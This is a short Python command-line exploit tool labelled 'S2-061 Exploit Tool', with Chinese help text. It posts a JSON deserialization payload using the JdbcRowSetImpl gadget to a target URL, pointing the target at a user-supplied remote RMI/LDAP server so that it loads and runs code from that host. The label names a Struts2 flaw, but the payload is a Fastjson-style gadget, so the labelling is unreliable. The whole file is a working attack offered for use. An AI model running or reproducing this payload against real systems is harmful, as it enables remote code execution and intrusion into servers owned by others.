import requests
import argparse
import json

header = {
    'Content-Type': 'application/json'
}

def send_data(url, payload):
    try:
        response = requests.post(url, headers=header, data=json.dumps(payload))
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Request failed with an error: {e}"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='S2-061 Exploit Tool')

    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-r', '--remote', type=str, help='要调用的远程rmi/ldap')

    args = parser.parse_args()
    url = args.url
    remote_url = args.remote

    if not url or not remote_url:
        print("请提供目标URL和要调用的远程rmi/ldap。")
        parser.print_help()
    else:
        payload = {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": remote_url,
                "autoCommit": True
            }
        }

        response_text = send_data(url, payload)
        print("响应内容:")
        print(response_text)
